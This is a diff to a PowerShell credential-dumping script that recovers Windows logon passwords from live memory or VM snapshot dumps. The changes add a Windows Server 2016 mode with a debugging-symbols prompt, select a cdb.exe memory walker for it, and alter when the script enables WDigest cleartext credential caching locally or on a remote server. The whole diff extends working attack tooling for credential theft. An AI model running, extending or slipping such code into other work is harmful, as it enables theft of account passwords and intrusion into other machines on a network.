@@ -49,6 +49,7 @@ $elevate = 0
 $dev_key = $null
 $snapshot = $false
 $toADD = 0
+$symbolsPath2016 = ""
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
@@ -152,7 +153,7 @@ if($dump -eq "dump" -or $dump -eq "snapshot") {
             $dump = Read-Host 'Enter the path of your VM snapshot dump'
         }
     }
-    $mode = Read-Host 'Mode (1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 232 (Win 10 32 bits) 8.1 (Win 8.1) or 3 (Windows 2003))?'
+    $mode = Read-Host 'Mode (3 (Windows 2003), 1 (Win 7 and 2008r2), 132 (Win 7 32 bits), 2 (Win 8 and 2012), 2r2 (Win 10 and 2012r2), 232 (Win 10 32 bits) 8.1 (Win 8.1) or 2016 (Windows Server 2016))?'
     switch ($mode){
         1 {Write-Output "Try to reveal password for Windows 7 or 2008r2"}
         132 {Write-Output "Try to reveal password for Windows 7 32bits"}
@@ -161,6 +162,9 @@ if($dump -eq "dump" -or $dump -eq "snapshot") {
         "232" {Write-Output "Try to reveal password for Windows 10 32 bits"}
         "8.1" {Write-Output "Try to reveal password for Windows 8.1"}
         3 {Write-Output "Try to reveal password for Windows XP or 2003"}
+        "2016" {Write-Output "Try to reveal password for Windows 2016"
+                $symbolsPath2016 = Read-Host 'Enter the Symbols path ?'
+                }
         default {
                 Write-Output "The mode could not be determined... terminating"
                 Stop-Script
@@ -197,7 +201,7 @@ else {
                 $mode = 2
             }
             else{
-                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240" -or $operatingSystem -eq "10.0.10514"){        
+                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240"){        
                     if($osArchitecture -like "64*") {                
                         $mode = "2r2"
                     }
@@ -206,8 +210,13 @@ else {
                     }
                 }
                 else {
-                    Write-Output "The operating system could not be determined... terminating..."
-                    Stop-Script 
+                    if ($operatingSystem -eq "10.0.10514"){
+                         $mode = "2016"
+                    }
+                    else {
+                        Write-Output "The operating system could not be determined... terminating..."
+                        Stop-Script 
+                    }
                 }
             }
         }
@@ -266,14 +275,19 @@ if($mode -eq "2r2" -or $mode -eq "232") {
             $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
         }
         else {
-            $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
+            if($mode -eq "2016"){
+                $memoryWalker = "$scriptPath\debugger\pre2r2vm\cdb.exe"
+            }
+            else {
+                $memoryWalker = "$scriptPath\debugger\pre2r2\cdb.exe"
+            }
         }
     }
-    if($dump -eq "" -or $dump -eq "gen") {
+    if($dump -eq "gen") {
         Set-WdigestProvider
     }
     else {
-        if(![string]::IsNullOrEmpty($server)){
+        if($dump -eq "" -and (![string]::IsNullOrEmpty($server))){
             Set-RemoteWdigestProvider $server
         }
     }
@@ -317,8 +331,8 @@ else {
 }
 
 if($snapshot -eq $false) {
-    if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "232") {       
-        Get-SupportedSystemsInformations $buffer $fullScriptPath 
+    if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2" -or $mode -eq "232" -or $mode -eq "2016") {       
+        Get-SupportedSystemsInformations $buffer $fullScriptPath         
     }
     else {    
         Get-ObsoleteSystemsInformations $buffer $fullScriptPath 
